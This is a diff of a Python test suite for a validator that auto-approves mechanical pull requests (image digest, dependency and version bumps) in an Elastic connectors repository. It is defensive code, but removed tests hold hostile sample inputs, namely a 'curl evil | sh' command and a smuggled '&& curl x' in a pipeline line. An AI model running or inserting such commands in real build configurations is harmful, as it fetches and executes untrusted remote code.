@@ -2,382 +2,281 @@
 
 import os
 import unittest
-import urllib.error
 from unittest import mock
 
 import validate_mechanical_pr as v
 
-SHA_A = "a" * 64
-SHA_B = "b" * 64
-WOLFI = "FROM docker.elastic.co/wolfi/python:3.11-dev@sha256:"
-DRA_TITLE = "Add 9.6 to DRA branch list"
-DRA_OLD = (
-    '    if: "(build.branch == \\"main\\" || build.branch == \\"9.5\\" || '
-    'build.pull_request.labels includes \\"ci:packaging\\")" # Add new maintenance branches here'
-)
-DRA_NEW = DRA_OLD.replace('build.branch == \\"9.5\\"', 'build.branch == \\"9.5\\" || build.branch == \\"9.6\\"')
+SHA_A, SHA_B = "a" * 64, "b" * 64
+FROM = "FROM docker.elastic.co/wolfi/python:3.11-dev@sha256:"
+PYPROJECT = "app/connectors_service/pyproject.toml"
+NOTICE = "app/connectors_service/NOTICE.txt"
+BASE_NOTICE = "graphql-core\n3.2.3\nMIT\nurllib3\n2.0.0\nMIT\nMIT License\n"
+BASE_TOML = """
+[project]
+name = "x"
+dependencies = [
+    "graphql-core==3.2.3",
+    "pymongo==4.0; platform_machine=='x86_64'",
+    "pymongo[srv]==4.0; platform_machine=='aarch64'",
+    "elasticsearch[async]==8.0",
+    "loose>=1",
+]
+[project.optional-dependencies]
+tests = ["graphql-core==3.2.3"]
+[tool.ruff]
+line-length = 100
+"""
 
 
 def modified(name, *lines):
-    return {"filename": name, "status": "modified", "patch": "@@ -1,1 +1,1 @@\n" + "\n".join(lines)}
+    return {"filename": name, "status": "modified", "patch": "@@ -1 +1 @@\n" + "\n".join(lines)}
 
 
-def wolfi_files():
-    return [
-        modified("Dockerfile.wolfi", f"-{WOLFI}{SHA_A}", f"+{WOLFI}{SHA_B}"),
-        modified("app/connectors_service/NOTICE.txt", "-2026.5", "+2026.6"),
-    ]
+def toml(*replacements, extra_dep=None):
+    text = BASE_TOML
+    for old, new in replacements:
+        assert old in text, old
+        text = text.replace(old, new)
+    return text.replace("    \"loose>=1\",\n", f"    \"loose>=1\",\n{extra_dep}" if extra_dep else "    \"loose>=1\",\n")
 
 
-def dep_files(old='"graphql-core==3.2.3",', new='"graphql-core==3.2.12",'):
-    return [
-        modified("app/connectors_service/pyproject.toml", f"-    {old}", f"+    {new}"),
-        modified("app/connectors_service/NOTICE.txt", "-3.2.3", "+3.2.12"),
-    ]
+def classify(title, files, author="dev", body="", member=True, head_toml=BASE_TOML, notice=BASE_NOTICE):
+    def read(path, ref):
+        if path.endswith("pyproject.toml"):
+            return head_toml if ref == "head" else BASE_TOML
+        return notice
+
+    return v.classify(title=title, body=body, author=author, is_member=lambda u: member, files=files, read=read)
 
 
-def version_files(new="9.7.0"):
-    return [
-        modified("app/connectors_service/connectors/VERSION", "-9.6.0", f"+{new}"),
-        modified("app/connectors_service/NOTICE.txt", "-9.6.0", f"+{new}"),
-    ]
-
-
-class Base(unittest.TestCase):
-    @classmethod
-    def setUpClass(cls):
-        cls.config = v.load_config()
-
-    NOTICE = "graphql-core\nMIT\nurllib3\nMIT\ncryptography\nApache\n"
-
-    def classify(self, title, files, author="dev", body="", member=True, notice=NOTICE):
-        return v.classify(
-            self.config,
-            title=title,
-            body=body,
-            author=author,
-            is_member=lambda user: member,
-            files=files,
-            read_base=lambda path: notice,
-        )
-
-
-class TestChangedLines(unittest.TestCase):
-    def test_keeps_lines_that_start_with_dashes(self):
-        patch = "@@ -1 +1 @@\n--- a yaml document marker\n+new"
-        self.assertEqual(v.changed_lines(patch), ["--- a yaml document marker", "+new"])
-
-    def test_ignores_context_hunk_and_missing_patch(self):
-        self.assertEqual(v.changed_lines("@@ -1 +1 @@\n context\n+x"), ["+x"])
-        self.assertEqual(v.changed_lines(None), [])
-
-
-class TestRenovateWolfi(Base):
+class TestWolfi(unittest.TestCase):
     TITLE = "chore(deps): update docker.elastic.co/wolfi/python:3.11-dev docker digest to abc"
     BOT = "elastic-renovate-prod[bot]"
 
+    def files(self, *extra):
+        return [modified("Dockerfile.wolfi", f"-{FROM}{SHA_A}", f"+{FROM}{SHA_B}"), modified(NOTICE, "-2026.5", "+2026.6"), *extra]
+
     def test_accepts_digest_swap(self):
-        self.assertEqual(self.classify(self.TITLE, wolfi_files(), self.BOT)[0], "renovate-wolfi")
+        self.assertEqual(classify(self.TITLE, self.files(), self.BOT)[0], "renovate-wolfi")
 
-    def test_rejects_other_author(self):
-        self.assertIsNone(self.classify(self.TITLE, wolfi_files(), "dev")[0])
-
-    def test_rejects_cli_style_bot_name(self):
-        self.assertIsNone(self.classify(self.TITLE, wolfi_files(), "app/elastic-renovate-prod")[0])
+    def test_rejects_wrong_author_and_cli_style_name(self):
+        for author in ("dev", "app/elastic-renovate-prod"):
+            self.assertIsNone(classify(self.TITLE, self.files(), author)[0])
 
     def test_rejects_other_dockerfile_change(self):
         files = [modified("Dockerfile.wolfi", "-USER root", "+USER evil")]
-        self.assertIsNone(self.classify(self.TITLE, files, self.BOT)[0])
+        self.assertIsNone(classify(self.TITLE, files, self.BOT)[0])
 
-    def test_rejects_added_line(self):
-        files = [modified("Dockerfile.wolfi", f"+{WOLFI}{SHA_B}")]
-        self.assertIsNone(self.classify(self.TITLE, files, self.BOT)[0])
-
-    def test_rejects_notice_text_change(self):
-        files = wolfi_files()[:1] + [modified("app/connectors_service/NOTICE.txt", "-MIT", "+evil")]
-        self.assertIsNone(self.classify(self.TITLE, files, self.BOT)[0])
+    def test_rejects_added_line_and_notice_text(self):
+        self.assertIsNone(classify(self.TITLE, [modified("Dockerfile.wolfi", f"+{FROM}{SHA_B}")], self.BOT)[0])
+        files = self.files()[:1] + [modified(NOTICE, "-MIT", "+evil")]
+        self.assertIsNone(classify(self.TITLE, files, self.BOT)[0])
 
 
-class TestDependencyBump(Base):
+class TestVersionBump(unittest.TestCase):
+    BOT = "elastic-vault-github-plugin-prod[bot]"
+
+    def files(self, new="9.7.0", notice_new="9.7.0"):
+        return [
+            modified("app/connectors_service/connectors/VERSION", "-9.6.0", f"+{new}"),
+            modified(NOTICE, "-9.6.0", f"+{notice_new}"),
+        ]
+
+    def test_accepts(self):
+        self.assertEqual(classify("Bump version to 9.7.0", self.files(), self.BOT)[0], "release-version-bump")
+
+    def test_rejects_title_author_and_foreign_notice_version(self):
+        self.assertIsNone(classify("Bump version to 9.8.0", self.files(), self.BOT)[0])
+        self.assertIsNone(classify("Bump version to 9.7.0", self.files(), "dev")[0])
+        self.assertIsNone(classify("Bump version to 9.7.0", self.files(notice_new="6.6.6"), self.BOT)[0])
+
+
+class TestDependencyBump(unittest.TestCase):
     TITLE = "fix(deps): bump graphql-core to 3.2.12 for CVE-2026-75508"
 
-    def test_accepts_version_change(self):
-        self.assertEqual(self.classify(self.TITLE, dep_files())[0], "dependency-bump")
+    def run_case(self, head_toml, title=TITLE, **kwargs):
+        files = [modified(PYPROJECT, "-x", "+y")]
+        return classify(title, files, head_toml=head_toml, **kwargs)[0]
 
-    def test_requires_team_member(self):
-        self.assertIsNone(self.classify(self.TITLE, dep_files(), member=False)[0])
+    def test_accepts_version_change_in_every_group(self):
+        head = BASE_TOML.replace("graphql-core==3.2.3", "graphql-core==3.2.12")  # runtime and tests
+        self.assertEqual(self.run_case(head), "dependency-bump")
 
-    def test_requires_advisory_id(self):
-        self.assertIsNone(self.classify("fix(deps): bump graphql-core to 3.2.12", dep_files())[0])
+    def test_accepts_one_group_only(self):
+        head = BASE_TOML.replace('tests = ["graphql-core==3.2.3"]', 'tests = ["graphql-core==3.2.12"]')
+        self.assertEqual(self.run_case(head), "dependency-bump")
 
-    def test_advisory_may_be_in_body(self):
-        title = "fix(deps): bump graphql-core to 3.2.12"
-        self.assertEqual(
-            self.classify(title, dep_files(), body="Fixes GHSA-6q48-6c7w-9gw2")[0], "dependency-bump"
-        )
+    def test_accepts_loose_spec_tightened_and_notice_swap(self):
+        title = "fix(deps): pin loose to 1.5 for GHSA-6q48-6c7w-9gw2"
+        files = [modified(PYPROJECT, "-x", "+y"), modified(NOTICE, "-1.0", "+1.5")]
+        head = BASE_TOML.replace("loose>=1", "loose==1.5")
+        self.assertEqual(classify(title, files, head_toml=head)[0], "dependency-bump")
 
-    def test_accepts_pinning_an_installed_but_unpinned_package(self):
+    def test_accepts_marker_pins_with_same_name(self):
+        title = "fix(deps): bump pymongo to 4.1 for CVE-2026-1234"
+        head = BASE_TOML.replace("pymongo==4.0", "pymongo==4.1").replace("pymongo[srv]==4.0", "pymongo[srv]==4.1")
+        self.assertEqual(self.run_case(head, title), "dependency-bump")
+
+    def test_accepts_pin_of_installed_unlisted_package(self):
         title = "fix(deps): pin urllib3 to 2.7.0 for CVE-2026-9375"
-        files = [modified("app/connectors_service/pyproject.toml", '+    "urllib3==2.7.0",')]
-        self.assertEqual(self.classify(title, files)[0], "dependency-bump")
-
-    def test_accepts_tightening_a_loose_spec_to_a_pin(self):
-        title = "fix(deps): pin urllib3 to 2.7.0 for CVE-2026-9375"
-        files = [modified("app/connectors_service/pyproject.toml", '-    "urllib3>=2",', '+    "urllib3==2.7.0",')]
-        self.assertEqual(self.classify(title, files)[0], "dependency-bump")
+        head = BASE_TOML.replace('"loose>=1",', '"loose>=1",\n    "urllib3==2.7.0",')
+        self.assertEqual(self.run_case(head, title), "dependency-bump")
 
     def test_rejects_package_that_is_not_installed(self):
         title = "fix(deps): pin evil to 1.0 for CVE-2026-9375"
-        files = [modified("app/connectors_service/pyproject.toml", '+    "evil==1.0",')]
-        category, reason = self.classify(title, files)
-        self.assertIsNone(category)
-        self.assertIn("not an installed package", reason)
+        head = BASE_TOML.replace('"loose>=1",', '"loose>=1",\n    "evil==1.0",')
+        self.assertIsNone(self.run_case(head, title))
 
-    def test_rejects_when_base_notice_is_missing(self):
-        title = "fix(deps): pin urllib3 to 2.7.0 for CVE-2026-9375"
-        files = [modified("app/connectors_service/pyproject.toml", '+    "urllib3==2.7.0",')]
-        self.assertIsNone(self.classify(title, files, notice=None)[0])
+    def test_license_text_in_notice_is_not_a_package(self):
+        title = "fix(deps): pin MIT to 1.0 for CVE-2026-9375"
+        head = BASE_TOML.replace('"loose>=1",', '"loose>=1",\n    "MIT==1.0",')
+        self.assertIsNone(self.run_case(head, title))
 
-    def test_rejects_removed_dependency(self):
-        files = [modified("app/connectors_service/pyproject.toml", '-    "graphql-core==3.2.3",')]
-        self.assertIsNone(self.classify(self.TITLE, files)[0])
+    def test_rejects_unlisted_pin_for_already_listed_name(self):
+        title = "fix(deps): pin graphql-core to 3.2.12 for CVE-2026-9375"
+        head = BASE_TOML.replace('"loose>=1",', '"loose>=1",\n    "graphql-core==3.2.12; sys_platform==\'x\'",')
+        self.assertIsNone(self.run_case(head, title))
 
-    def test_rejects_unpinned_added_line(self):
-        title = "fix(deps): pin urllib3 to 2 for CVE-2026-9375"
-        files = [modified("app/connectors_service/pyproject.toml", '+    "urllib3>=2",')]
-        self.assertIsNone(self.classify(title, files)[0])
+    def test_rejects_moving_a_dependency_between_groups(self):
+        head = BASE_TOML.replace('tests = ["graphql-core==3.2.3"]', "tests = []").replace(
+            '"loose>=1",', '"loose>=1",\n    "graphql-core==3.2.12",'
+        ).replace('    "graphql-core==3.2.3",\n', "")
+        self.assertIsNone(self.run_case(head))
 
-    def test_rejects_package_swap(self):
-        files = dep_files(new='"evil==3.2.12",')
-        self.assertIsNone(self.classify(self.TITLE, files)[0])
+    def test_rejects_dropped_extras_marker_or_dependency(self):
+        for old, new in (
+            ("elasticsearch[async]==8.0", "elasticsearch==8.1"),
+            ("pymongo==4.0; platform_machine=='x86_64'", "pymongo==4.1"),
+            ('    "loose>=1",\n', ""),
+        ):
+            title = "fix(deps): bump elasticsearch pymongo loose to 8.1 for CVE-2026-1234"
+            self.assertIsNone(self.run_case(BASE_TOML.replace(old, new), title), old)
 
-    def test_rejects_package_not_in_title(self):
-        files = dep_files(old='"other==1.0",', new='"other==2.0",')
-        self.assertIsNone(self.classify(self.TITLE, files)[0])
+    def test_rejects_changes_outside_dependency_lists(self):
+        head = BASE_TOML.replace("graphql-core==3.2.3", "graphql-core==3.2.12").replace("line-length = 100", "line-length = 1")
+        self.assertIsNone(self.run_case(head))
 
-    def test_rejects_unchanged_version(self):
-        files = dep_files(new='"graphql-core==3.2.3",')
-        self.assertIsNone(self.classify(self.TITLE, files)[0])
+    def test_rejects_non_pin_and_missing_title_name_and_no_change(self):
+        self.assertIsNone(self.run_case(BASE_TOML.replace("graphql-core==3.2.3", "graphql-core>=3.2.12")))
+        self.assertIsNone(self.run_case(BASE_TOML.replace("loose>=1", "loose==2"), self.TITLE))
+        self.assertIsNone(self.run_case(BASE_TOML))
 
-    def test_rejects_non_pin_line(self):
-        files = [
-            modified("app/connectors_service/pyproject.toml", '-name = "a"', '+name = "b"'),
-        ]
-        self.assertIsNone(self.classify(self.TITLE, files)[0])
-
-    def test_rejects_unrelated_file(self):
-        files = dep_files() + [modified("app/connectors_service/connectors/x.py", "-a", "+b")]
-        self.assertIsNone(self.classify(self.TITLE, files)[0])
-
-    def test_two_packages_named_in_title(self):
-        title = "fix(deps): bump pyOpenSSL to 26.4.0 and click to 8.3.3 for CVE-2026-1234"
-        files = [
-            modified(
-                "app/connectors_service/pyproject.toml",
-                '-    "pyOpenSSL==26.3.0",',
-                '-    "click==8.3.2",',
-                '+    "pyOpenSSL==26.4.0",',
-                '+    "click==8.3.3",',
-            ),
-            modified("app/connectors_service/NOTICE.txt", "-26.3.0", "-8.3.2", "+26.4.0", "+8.3.3"),
-        ]
-        self.assertEqual(self.classify(title, files)[0], "dependency-bump")
-
-
-class TestReleaseVersionBump(Base):
-    BOT = "elastic-vault-github-plugin-prod[bot]"
-
-    def test_accepts_version_bump(self):
+    def test_requires_advisory_and_team_member(self):
+        head = BASE_TOML.replace("graphql-core==3.2.3", "graphql-core==3.2.12")
+        self.assertIsNone(self.run_case(head, "fix(deps): bump graphql-core to 3.2.12"))
+        self.assertIsNone(self.run_case(head, member=False))
         self.assertEqual(
-            self.classify("Bump version to 9.7.0", version_files(), self.BOT)[0], "release-version-bump"
+            self.run_case(head, "fix(deps): bump graphql-core to 3.2.12", body="GHSA-6q48-6c7w-9gw2"), "dependency-bump"
         )
 
-    def test_rejects_title_mismatch(self):
-        self.assertIsNone(self.classify("Bump version to 9.8.0", version_files(), self.BOT)[0])
-
-    def test_rejects_other_author(self):
-        self.assertIsNone(self.classify("Bump version to 9.7.0", version_files(), "dev")[0])
-
-    def test_rejects_notice_change_to_other_version(self):
-        files = [
-            version_files()[0],
-            modified("app/connectors_service/NOTICE.txt", "-1.0.0", "+6.6.6"),
-        ]
-        self.assertIsNone(self.classify("Bump version to 9.7.0", files, self.BOT)[0])
+    def test_rejects_unrelated_file(self):
+        files = [modified(PYPROJECT, "-x", "+y"), modified("app/connectors_service/connectors/x.py", "-a", "+b")]
+        head = BASE_TOML.replace("graphql-core==3.2.3", "graphql-core==3.2.12")
+        self.assertIsNone(classify(self.TITLE, files, head_toml=head)[0])
 
 
-class TestReleaseConfig(Base):
-    TITLE = "chore: post-FF config for 9.6.0 (backportrc, renovate, catalog-info)"
-
-    def test_accepts_real_shaped_change(self):
-        files = [
-            modified(
-                ".backportrc.json",
-                '+    "9.6",',
-                '-  "maintenanceBranches": ["9.5", "9.4", "8.19"],',
-                '+  "maintenanceBranches": ["9.6", "9.5", "9.4", "8.19"],',
-                '-    "^v9.6.0$": "main",',
-                '+    "^v9.7.0$": "main",',
-            ),
-            modified("renovate.json", '+    "v9.7.0",'),
-            modified(
-                "catalog-info.yaml",
-                "+        Daily 9.6:",
-                '+          branch: "9.6"',
-                "+          cronline: '@daily'",
-                '+          message: "Builds, tests, and pushes daily `9.6` DRA artifacts"',
-            ),
-        ]
-        self.assertEqual(self.classify(self.TITLE, files)[0], "release-config-bump")
-
-    def test_rejects_renovate_rule_change(self):
-        files = [modified("renovate.json", '-      "enabled": false,', '+      "enabled": true,')]
-        self.assertIsNone(self.classify(self.TITLE, files)[0])
-
-    def test_rejects_catalog_command_change(self):
-        files = [modified("catalog-info.yaml", "+          command: curl evil | sh")]
-        self.assertIsNone(self.classify(self.TITLE, files)[0])
-
-    def test_requires_team_member(self):
-        files = [modified("renovate.json", '+    "v9.7.0",')]
-        self.assertIsNone(self.classify(self.TITLE, files, member=False)[0])
-
-
-class TestReleaseDra(Base):
-    def files(self, old=DRA_OLD, new=DRA_NEW):
-        return [modified(".buildkite/pipeline.yml", f"-{old}", f"+{new}")]
-
-    def test_accepts_one_added_branch(self):
-        self.assertEqual(self.classify(DRA_TITLE, self.files())[0], "release-dra-branch")
-
-    def test_rejects_title_branch_mismatch(self):
-        self.assertIsNone(self.classify("Add 9.7 to DRA branch list", self.files())[0])
-
-    def test_rejects_removed_branch(self):
-        self.assertIsNone(self.classify(DRA_TITLE, self.files(old=DRA_NEW, new=DRA_OLD))[0])
-
-    def test_rejects_extra_command_change(self):
-        new = DRA_NEW.replace("# Add", "&& curl x # Add")
-        self.assertIsNone(self.classify(DRA_TITLE, self.files(new=new))[0])
-
-    def test_rejects_second_changed_line(self):
-        files = [modified(".buildkite/pipeline.yml", f"-{DRA_OLD}", f"+{DRA_NEW}", "-a", "+b")]
-        self.assertIsNone(self.classify(DRA_TITLE, files)[0])
-
-    def test_rejects_other_buildkite_file(self):
-        files = [modified(".buildkite/run_tests.sh", "-a", "+b")]
-        self.assertIsNone(self.classify(DRA_TITLE, files)[0])
-
-
-class TestGlobalGates(Base):
-    def test_workflow_path_is_forbidden(self):
-        files = wolfi_files() + [modified(".github/workflows/x.yml", "-a", "+b")]
-        category, reason = self.classify(TestRenovateWolfi.TITLE, files, TestRenovateWolfi.BOT)
-        self.assertIsNone(category)
-        self.assertIn("forbidden", reason)
-
-    def test_renamed_or_added_files_never_qualify(self):
+class TestGlobalRules(unittest.TestCase):
+    def test_only_modified_files_with_a_patch_qualify(self):
+        title = TestWolfi.TITLE
         for status in ("added", "removed", "renamed"):
-            files = wolfi_files()
+            files = TestWolfi().files()
             files[0]["status"] = status
-            self.assertIsNone(self.classify(TestRenovateWolfi.TITLE, files, TestRenovateWolfi.BOT)[0])
-
-    def test_empty_patch_never_qualifies(self):
+            self.assertIsNone(classify(title, files, TestWolfi.BOT)[0])
         files = [{"filename": "Dockerfile.wolfi", "status": "modified", "patch": None}]
-        self.assertIsNone(self.classify(TestRenovateWolfi.TITLE, files, TestRenovateWolfi.BOT)[0])
+        self.assertIsNone(classify(title, files, TestWolfi.BOT)[0])
+
+    def test_workflow_files_never_qualify(self):
+        files = TestWolfi().files(modified(".github/workflows/x.yml", "-a", "+b"))
+        self.assertIsNone(classify(TestWolfi.TITLE, files, TestWolfi.BOT)[0])
 
 
 class TestCi(unittest.TestCase):
-    CONTEXTS = ["CLA", "buildkite/connectors"]
-
-    def run_ci(self, statuses, runs):
-        payloads = iter([{"statuses": statuses}, {"check_runs": runs}])
-        with mock.patch.object(v, "_get", lambda url, token: next(payloads)):
-            return v.ci_is_green("o/r", "sha", "t", self.CONTEXTS)
-
-    def ok_statuses(self):
-        return [{"context": c, "state": "success"} for c in self.CONTEXTS]
-
-    def test_green(self):
-        self.assertTrue(self.run_ci(self.ok_statuses(), [{"name": "x", "status": "completed", "conclusion": "success"}])[0])
-
-    def test_missing_status(self):
-        self.assertFalse(self.run_ci(self.ok_statuses()[:1], [])[0])
-
-    def test_pending_status(self):
-        statuses = self.ok_statuses()
-        statuses[1]["state"] = "pending"
-        self.assertFalse(self.run_ci(statuses, [])[0])
-
-    def test_failed_check_run(self):
-        runs = [{"name": "x", "status": "completed", "conclusion": "failure"}]
-        self.assertFalse(self.run_ci(self.ok_statuses(), runs)[0])
-
-    def test_running_check_run_blocks_but_not_our_own(self):
-        own = {"name": v.SELF_CHECK_NAME, "status": "in_progress", "conclusion": None}
-        other = {"name": "x", "status": "in_progress", "conclusion": None}
-        self.assertTrue(self.run_ci(self.ok_statuses(), [own])[0])
-        self.assertFalse(self.run_ci(self.ok_statuses(), [own, other])[0])
-
-    def test_api_error_fails_closed(self):
-        def boom(url, token):
-            raise urllib.error.HTTPError(url, 500, "x", {}, None)
-
-        with mock.patch.object(v, "_get", boom):
-            self.assertFalse(v.ci_is_green("o/r", "sha", "t", self.CONTEXTS)[0])
+    def test_needs_both_statuses_green(self):
+        ok = [{"context": "CLA", "state": "success"}, {"context": "buildkite/connectors", "state": "success"}]
+        self.assertTrue(v.ci_is_green(ok))
+        self.assertFalse(v.ci_is_green(ok[:1]))
+        self.assertFalse(v.ci_is_green([ok[0], {"context": "buildkite/connectors", "state": "failure"}]))
 
 
-class TestEvaluate(Base):
+class TestMain(unittest.TestCase):
+    """The approve and withdraw flow with the GitHub API mocked."""
+
+    GREEN = {"statuses": [{"context": c, "state": "success"} for c in v.REQUIRED_STATUSES]}
+
+    def run_main(self, category="renovate-wolfi", statuses=GREEN, heads=("h1", "h1"), reviews=()):
+        calls = []
+        pulls = iter({"number": 7, "head": {"sha": h}} for h in heads)
+
+        def api(method, path, token, payload=None, raw=False):
+            calls.append((method, path))
+            if path == "pulls/7":
+                return next(pulls)
+            if path.startswith("pulls/7/reviews?"):
+                return list(reviews)
+            if path.endswith("/status"):
+                return statuses
+
+        env = {"GITHUB_TOKEN": "t", "TEAM_TOKEN": "p", "PR_NUMBER": "7", "GITHUB_REPOSITORY": "o/r"}
+        with mock.patch.dict(os.environ, env, clear=True), mock.patch.object(v, "api", api), mock.patch.object(
+            v, "qualifying_category", lambda *a: category
+        ):
+            v.main()
+        return [c for c in calls if c[0] in ("POST", "PUT")]
+
+    def bot_review(self, commit="old"):
+        return {"id": 5, "commit_id": commit, "state": "APPROVED", "user": {"login": v.BOT}}
+
+    def test_approves_when_qualifying_and_green(self):
+        self.assertEqual(self.run_main(), [("POST", "pulls/7/reviews")])
+
+    def test_red_or_pending_ci_does_not_approve_or_withdraw(self):
+        self.assertEqual(self.run_main(statuses={"statuses": []}, reviews=[self.bot_review()]), [])
+
+    def test_head_moved_while_checking_does_not_approve(self):
+        self.assertEqual(self.run_main(heads=("h1", "h2")), [])
+
+    def test_already_approved_at_this_commit(self):
+        self.assertEqual(self.run_main(reviews=[self.bot_review("h1")]), [])
+
+    def test_stops_qualifying_withdraws_bot_approval(self):
+        self.assertEqual(self.run_main(category=None, reviews=[self.bot_review()]), [("PUT", "pulls/7/reviews/5/dismissals")])
+
+    def test_other_reviewers_are_left_alone(self):
+        other = {**self.bot_review(), "user": {"login": "human"}}
+        self.assertEqual(self.run_main(category=None, reviews=[other]), [])
+
+
+class TestQualifyingCategory(unittest.TestCase):
     def pull(self, **overrides):
         pull = {
             "number": 7,
-            "title": TestRenovateWolfi.TITLE,
-            "body": "",
+            "title": TestWolfi.TITLE,
             "draft": False,
-            "labels": [],
-            "user": {"login": TestRenovateWolfi.BOT},
-            "base": {"ref": "main"},
-            "head": {"sha": "abc", "repo": {"full_name": "o/r"}},
+            "user": {"login": TestWolfi.BOT},
+            "base": {"ref": "main", "sha": "b"},
+            "head": {"sha": "h", "repo": {"full_name": "o/r"}},
         }
-        pull.update(overrides)
-        return pull
+        return pull | overrides
 
-    def evaluate(self, pull, green=True):
-        with mock.patch.dict(os.environ, {"ALLOWED_TEAMS": "team"}, clear=True), mock.patch.object(
-            v, "_get", lambda url, token: wolfi_files()
-        ), mock.patch.object(v, "_request") as request, mock.patch.object(
-            v, "ci_is_green", lambda *a: (green, "CI")
+    def run_case(self, pull, files=None):
+        files = TestWolfi().files() if files is None else files
+        with mock.patch.dict(os.environ, {"GITHUB_REPOSITORY": "o/r"}, clear=True), mock.patch.object(
+            v, "api", lambda *a, **k: files
         ):
-            return v.evaluate(pull, self.config, "o/r", "t", "t"), request
+            return v.qualifying_category(pull, "t", "p")
 
-    def test_approves_and_labels_when_green(self):
-        result, request = self.evaluate(self.pull())
-        self.assertTrue(result.approved)
-        self.assertTrue(result.qualifies)
-        self.assertEqual(result.category, "renovate-wolfi")
-        request.assert_called_once()
-        self.assertEqual(result.head_sha, "abc")
+    def test_matches(self):
+        self.assertEqual(self.run_case(self.pull()), "renovate-wolfi")
 
-    def test_red_ci_does_not_approve_but_still_qualifies(self):
-        # qualifies stays true so a flaky failure never withdraws an approval
-        result, _ = self.evaluate(self.pull(), green=False)
-        self.assertFalse(result.approved)
-        self.assertTrue(result.qualifies)
-
-    def test_rejects_draft_fork_and_other_base(self):
+    def test_rejects_draft_fork_other_base_and_huge_prs(self):
         for override in (
             {"draft": True},
-            {"base": {"ref": "9.5"}},
-            {"head": {"sha": "abc", "repo": {"full_name": "fork/r"}}},
-            {"head": {"sha": "abc", "repo": None}},
+            {"base": {"ref": "9.5", "sha": "b"}},
+            {"head": {"sha": "h", "repo": {"full_name": "fork/r"}}},
+            {"head": {"sha": "h", "repo": None}},
         ):
-            result, _ = self.evaluate(self.pull(**override))
-            self.assertFalse(result.approved, override)
-            self.assertFalse(result.qualifies, override)
-
-    def test_label_not_added_twice(self):
-        result, request = self.evaluate(self.pull(labels=[{"name": "mechanical-pr"}]))
-        request.assert_not_called()
+            self.assertIsNone(self.run_case(self.pull(**override)), override)
+        self.assertIsNone(self.run_case(self.pull(), files=[modified("a", "+b")] * 100))
 
 
 if __name__ == "__main__":
